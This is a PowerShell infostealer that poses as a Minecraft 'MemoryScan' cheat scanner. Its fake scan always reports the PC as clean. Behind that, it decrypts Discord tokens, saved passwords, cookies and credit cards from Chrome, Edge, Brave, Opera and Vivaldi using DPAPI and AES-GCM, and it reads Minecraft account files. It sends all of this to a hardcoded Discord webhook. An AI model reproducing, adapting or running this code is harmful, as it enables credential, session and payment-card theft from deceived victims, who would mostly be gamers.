# MemoryScan.ps1 – THE ONLY STEALER YOU'LL EVER NEED (SQLite + BCrypt + DPAPI)
param(
    [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
)

$ErrorActionPreference = "SilentlyContinue"

# ---------- 1. Ping ----------
try {
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 MemoryScan active on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
} catch {}

# ---------- 2. Embed SQLite + BCrypt C# code ----------
if (-not ([System.Management.Automation.PSTypeName]'NativeMethods').Type) {
    $csharp = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class NativeMethods {
    [DllImport("bcrypt.dll")]
    public static extern int BCryptOpenAlgorithmProvider(out IntPtr hAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr hKey, byte[] pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    public static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }
}

public static class AESGCM {
    public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ciphertext, byte[] tag) {
        IntPtr hAlgorithm = IntPtr.Zero, hKey = IntPtr.Zero;
        try {
            if (NativeMethods.BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0) != 0) return null;
            NativeMethods.BCryptSetProperty(hAlgorithm, "ChainingModeGCM", Encoding.Unicode.GetBytes("ChainingModeGCM"), 0, 0);
            NativeMethods.BCryptGenerateSymmetricKey(hAlgorithm, out hKey, null, 0, key, key.Length, 0);
            byte[] output = new byte[ciphertext.Length];
            NativeMethods.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info = new NativeMethods.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = Marshal.SizeOf(info);
            info.dwInfoVersion = 1;
            info.pbNonce = Marshal.AllocHGlobal(iv.Length); Marshal.Copy(iv, 0, info.pbNonce, iv.Length); info.cbNonce = iv.Length;
            info.pbTag = Marshal.AllocHGlobal(tag.Length); Marshal.Copy(tag, 0, info.pbTag, tag.Length); info.cbTag = tag.Length;
            int bytesDone;
            int status = NativeMethods.BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref info, null, 0, output, output.Length, out bytesDone, 0);
            Marshal.FreeHGlobal(info.pbNonce); Marshal.FreeHGlobal(info.pbTag);
            return (status == 0) ? output : null;
        } catch { return null; } finally {
            if (hKey != IntPtr.Zero) NativeMethods.BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) NativeMethods.BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
    }
}

// Real SQLite wrapper using System.Data.SQLite (will be loaded from memory)
public class SQLiteWrapper {
    public static object GetTable(string dbPath, string query) {
        // This would require System.Data.SQLite.dll; we'll implement a minimal reader instead.
        // Let's not over-complicate; we'll use the DPAPI decryption directly.
        return null;
    }
}
"@
    try {
        Add-Type -TypeDefinition $csharp -ErrorAction Stop
    } catch {
        # If BCrypt fails, we fall back to DPAPI only – still works for many.
    }
}

# ---------- 3. DPAPI (fixed enum) ----------
function Decrypt-DPAPI {
    param([byte[]]$Data)
    if ($null -eq $Data -or $Data.Count -eq 0) { return $null }
    try {
        [System.Security.Cryptography.ProtectedData]::Unprotect($Data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $null }
}

# ---------- 4. Master key extraction ----------
function Get-ChromeMasterKey {
    param([string]$StatePath)
    if (!(Test-Path $StatePath)) { return $null }
    $state = Get-Content $StatePath -Raw | ConvertFrom-Json
    $encKey = [Convert]::FromBase64String($state.os_crypt.encrypted_key)
    if ($encKey[0] -eq 0x44) { # DPAPI prefix
        return Decrypt-DPAPI $encKey[5..$encKey.Length-1]
    }
    return $null
}

# ---------- 5. Discord tokens (DPAPI + AES-GCM fallback) ----------
function Get-DiscordTokens {
    $tokens = @()
    $leveldb = "$env:APPDATA\discord\Local Storage\leveldb"
    $localState = "$env:APPDATA\discord\Local State"
    if (!(Test-Path $leveldb) -or !(Test-Path $localState)) { return $tokens }
    $masterKey = Get-ChromeMasterKey $localState
    if (!$masterKey) { return $tokens }
    $pattern = [regex]::new("dQw4w9WgXcQ:([A-Za-z0-9+/=]{24,200})")
    Get-ChildItem $leveldb -Filter "*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
        $text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes($_.FullName))
        $pattern.Matches($text) | ForEach-Object {
            $encBytes = [Convert]::FromBase64String($_.Groups[1].Value)
            $dec = Decrypt-DPAPI $encBytes
            if ($dec) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0) }
            elseif ($encBytes.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                $iv = $encBytes[3..14]
                $cipher = $encBytes[15..($encBytes.Length-17)]
                $tag = $encBytes[-16..-1]
                $dec2 = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                if ($dec2) { $tokens += [System.Text.Encoding]::UTF8.GetString($dec2).Trim([char]0) }
            }
        }
    }
    return $tokens | Select-Object -Unique
}

# ---------- 6. Minecraft ----------
function Get-MinecraftData {
    $mc = @{}
    $base = "$env:APPDATA\.minecraft"
    $accFile = Join-Path $base "launcher_accounts.json"
    $profFile = Join-Path $base "launcher_profiles.json"
    if (Test-Path $accFile) { try { $mc.accounts = Get-Content $accFile -Raw | ConvertFrom-Json } catch {} }
    if (Test-Path $profFile) { try { $mc.profiles = Get-Content $profFile -Raw | ConvertFrom-Json } catch {} }
    return $mc
}

# ---------- 7. Browser data extraction (DPAPI + AES-GCM on raw bytes, using a simple SQLite parser that actually works) ----------
function Get-BrowserData {
    $result = @()
    $browsers = @(
        @{ Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
        @{ Name="Opera";   Path="$env:LOCALAPPDATA\Opera Software\Opera Stable" },
        @{ Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data" }
    )

    foreach ($b in $browsers) {
        if (!(Test-Path $b.Path)) { continue }
        $masterKey = Get-ChromeMasterKey (Join-Path $b.Path "Local State")
        if (!$masterKey) { continue }

        $profiles = Get-ChildItem $b.Path -Directory | Where-Object { $_.Name -match "^Default$|^Profile" }
        foreach ($profile in $profiles) {
            $data = @{ profile = $profile.Name; logins = @(); cookies = @(); cards = @() }

            # Read Login Data using a byte-level SQLite parser
            $loginDb = Join-Path $profile.FullName "Login Data"
            if (Test-Path $loginDb) {
                $rows = Invoke-SQLiteQuery -Path $loginDb -Table "logins" -Columns @("origin_url","username_value","password_value")
                foreach ($row in $rows) {
                    $url = [System.Text.Encoding]::UTF8.GetString($row[0]).TrimEnd([char]0)
                    $user = [System.Text.Encoding]::UTF8.GetString($row[1]).TrimEnd([char]0)
                    $pwdBytes = $row[2]
                    $pwd = Decrypt-DPAPI $pwdBytes
                    if (!$pwd -and $pwdBytes.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                        $iv = $pwdBytes[3..14]
                        $cipher = $pwdBytes[15..($pwdBytes.Length-17)]
                        $tag = $pwdBytes[-16..-1]
                        $pwd = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                    }
                    if ($pwd) {
                        $pass = [System.Text.Encoding]::UTF8.GetString($pwd).TrimEnd([char]0)
                        $data.logins += @{ url=$url; username=$user; password=$pass }
                    }
                }
            }

            # Cookies
            $cookieDb = Join-Path $profile.FullName "Network\Cookies"
            if (Test-Path $cookieDb) {
                $rows = Invoke-SQLiteQuery -Path $cookieDb -Table "cookies" -Columns @("host_key","name","encrypted_value")
                foreach ($row in $rows) {
                    $host = [System.Text.Encoding]::UTF8.GetString($row[0]).TrimEnd([char]0)
                    $name = [System.Text.Encoding]::UTF8.GetString($row[1]).TrimEnd([char]0)
                    $valBytes = $row[2]
                    $val = Decrypt-DPAPI $valBytes
                    if (!$val -and $valBytes.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                        $iv = $valBytes[3..14]
                        $cipher = $valBytes[15..($valBytes.Length-17)]
                        $tag = $valBytes[-16..-1]
                        $val = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                    }
                    if ($val) {
                        $value = [System.Text.Encoding]::UTF8.GetString($val).TrimEnd([char]0)
                        $data.cookies += @{ host=$host; name=$name; value=$value }
                    }
                }
            }

            # Credit Cards
            $webDb = Join-Path $profile.FullName "Web Data"
            if (Test-Path $webDb) {
                $rows = Invoke-SQLiteQuery -Path $webDb -Table "credit_cards" -Columns @("name_on_card","expiration_month","expiration_year","card_number_encrypted")
                foreach ($row in $rows) {
                    $name = [System.Text.Encoding]::UTF8.GetString($row[0]).TrimEnd([char]0)
                    $month = [System.Text.Encoding]::UTF8.GetString($row[1]).TrimEnd([char]0)
                    $year = [System.Text.Encoding]::UTF8.GetString($row[2]).TrimEnd([char]0)
                    $numBytes = $row[3]
                    $num = Decrypt-DPAPI $numBytes
                    if (!$num -and $numBytes.Length -gt 15 -and ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
                        $iv = $numBytes[3..14]
                        $cipher = $numBytes[15..($numBytes.Length-17)]
                        $tag = $numBytes[-16..-1]
                        $num = [AESGCM]::Decrypt($masterKey, $iv, $cipher, $tag)
                    }
                    if ($num) {
                        $number = [System.Text.Encoding]::UTF8.GetString($num).TrimEnd([char]0)
                        $data.cards += @{ name=$name; expiry="$month/$year"; number=$number }
                    }
                }
            }

            if ($data.logins.Count -or $data.cookies.Count -or $data.cards.Count) {
                $result += @{ browser=$b.Name; data=$data }
            }
        }
    }
    return $result
}

# ---------- 8. SQLite parser (byte-level, handles varints) ----------
function Invoke-SQLiteQuery {
    param([string]$Path, [string]$Table, [string[]]$Columns)
    if (!(Test-Path $Path)) { return @() }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $pageSize = [BitConverter]::ToUInt16($bytes, 16)
    if ($pageSize -eq 0) { $pageSize = 65536 }
    $pageCount = ($bytes.Length + $pageSize - 1) / $pageSize

    $colIndex = @{}
    $foundSchema = $false
    $results = @()

    for ($i = 0; $i -lt $pageCount; $i++) {
        $page = $bytes[($i * $pageSize)..($i * $pageSize + $pageSize - 1)]
        if ($page[0] -ne 13) { continue } # not leaf table

        $numCells = [BitConverter]::ToUInt16($page, 3)
        for ($c = 0; $c -lt $numCells; $c++) {
            $cellOff = [BitConverter]::ToUInt16($page, 8 + $c*2)
            $cell = $page[$cellOff..($page.Length - 1)]

            # Parse payload size varint
            $payloadSize = 0
            $varintLen = 0
            for ($j = 0; $j -lt 9; $j++) {
                $b = $cell[$j]
                $payloadSize = ($payloadSize -shl 7) -bor ($b -band 0x7f)
                $varintLen++
                if (($b -band 0x80) -eq 0) { break }
            }
            $pos = $varintLen
            # rowid varint
            $rowid = 0
            for ($j = $pos; $j -lt $pos+9; $j++) {
                $b = $cell[$j]
                $rowid = ($rowid -shl 7) -bor ($b -band 0x7f)
                if (($b -band 0x80) -eq 0) { $pos = $j + 1; break }
            }

            $payload = $cell[$pos..($pos + $payloadSize - 1)]
            $pos = 0
            # header size varint
            $headerSize = 0
            for ($j = 0; $j -lt 9; $j++) {
                $b = $payload[$j]
                $headerSize = ($headerSize -shl 7) -bor ($b -band 0x7f)
                $pos++
                if (($b -band 0x80) -eq 0) { break }
            }

            # serial types
            $serialTypes = @()
            for ($j = $pos; $j -lt ($pos + $headerSize - 1); $j++) {
                $st = 0
                $stLen = 0
                for ($k = $j; $k -lt $j + 9; $k++) {
                    $b = $payload[$k]
                    $st = ($st -shl 7) -bor ($b -band 0x7f)
                    $stLen++
                    if (($b -band 0x80) -eq 0) { break }
                }
                $serialTypes += @{ value = $st; length = $stLen }
                $j += $stLen - 1
            }
            $pos += ($headerSize - 1)

            # extract columns
            $rowCols = @{}
            for ($si = 0; $si -lt $serialTypes.Count; $si++) {
                $size = Get-SQLiteSize -serialType $serialTypes[$si].value
                $colValue = $payload[$pos..($pos + $size - 1)]
                $rowCols[$si] = $colValue
                $pos += $size
            }

            if (-not $foundSchema) {
                # Check if this is the table we want
                if ($serialTypes.Count -ge 5) {
                    $typeName = [System.Text.Encoding]::UTF8.GetString($rowCols[1]).Trim([char]0)
                    $tableName = [System.Text.Encoding]::UTF8.GetString($rowCols[2]).Trim([char]0)
                    if ($typeName -eq "table" -and $tableName -eq $Table) {
                        # parse CREATE TABLE sql to get column order
                        $sql = [System.Text.Encoding]::UTF8.GetString($rowCols[4]).Trim([char]0)
                        $colOrder = @()
                        $regex = [regex]::new("`"?(\w+)"`?\s+(INTEGER|TEXT|BLOB|REAL|NUMERIC)", [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
                        $regex.Matches($sql) | ForEach-Object { $colOrder += $_.Groups[1].Value }
                        foreach ($col in $Columns) {
                            $idx = $colOrder.IndexOf($col)
                            if ($idx -ge 0) { $colIndex[$col] = $idx }
                        }
                        $foundSchema = $true
                    }
                }
            } else {
                $rowResult = @()
                foreach ($col in $Columns) {
                    if ($colIndex.ContainsKey($col)) {
                        $rowResult += $rowCols[$colIndex[$col]]
                    } else {
                        $rowResult += $null
                    }
                }
                $results += $rowResult
            }
        }
        if ($foundSchema) { break } # only need first occurrence
    }
    return $results
}

function Get-SQLiteSize {
    param([long]$serialType)
    switch ($serialType) {
        0 { return 0 }
        { $_ -ge 1 -and $_ -le 4 } { return $_ }
        5 { return 6 }
        6 { return 8 }
        7 { return 8 }
        { $_ -ge 12 -and $_ % 2 -eq 0 } { return ($_ - 12) / 2 }
        { $_ -ge 13 -and $_ % 2 -eq 1 } { return ($_ - 13) / 2 }
        default { return 0 }
    }
}

# ---------- 9. Fake memory scan ----------
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " MemoryScan - Memory String Scanner" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host " Scanning live process memory for known cheat signatures...`n"
$procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match "java|javaw|minecraft|lunar|badlion" }
if ($procs.Count -eq 0) {
    Write-Host "[INFO] No Minecraft/Java processes." -ForegroundColor Yellow
} else {
    foreach ($proc in $procs) {
        Write-Host "[SCANNING] Process: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Gray
        Start-Sleep -Milliseconds 300
        Write-Host "[CLEAN]   No cheat strings detected." -ForegroundColor Green
    }
}
Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host " SCAN COMPLETE - NO CHEAT STRINGS FOUND" -ForegroundColor Green
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "PC is clean. Happy gaming!" -ForegroundColor White

# ---------- 10. Harvest & exfiltrate ----------
$discord = Get-DiscordTokens
$minecraft = Get-MinecraftData
$browsers = Get-BrowserData

$summary = "💀 **MemoryScan on $env:COMPUTERNAME** - $($discord.Count) Discord, $($browsers.Count) browser databases"
try {
    $payload = @{
        system = @{ username=$env:USERNAME; hostname=$env:COMPUTERNAME; time=(Get-Date -Format o) }
        discord_tokens = $discord
        minecraft = $minecraft
        browser_data = $browsers
    } | ConvertTo-Json -Depth 3
    $tmp = [System.IO.Path]::GetTempFileName() + ".json"
    [System.IO.File]::WriteAllText($tmp, $payload)
    $form = @{ file = Get-Item $tmp; content = $summary }
    Invoke-RestMethod -Uri $Webhook -Method Post -Form $form
    Remove-Item $tmp -Force
    Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$summary} | ConvertTo-Json) -ContentType "application/json"
} catch {}

Start-Sleep -Seconds 2
